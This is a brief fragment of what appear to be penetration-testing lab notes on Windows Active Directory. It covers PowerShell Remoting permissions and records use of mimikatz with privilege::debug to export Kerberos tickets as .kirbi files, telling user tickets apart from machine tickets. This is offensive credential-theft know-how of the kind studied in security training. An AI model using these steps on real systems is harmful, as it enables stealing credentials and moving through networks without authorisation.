...
- must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.
...
- Used mimikatz to get all the tickets
- ```
  .\mimikatz.exe
  privilege::debug
  ...
  dir *.kirbi
  ```
  ![[Pasted image 20260226081219.png]]
- we know that these 3 are the user hashes since there is no $ sign in them.
- 
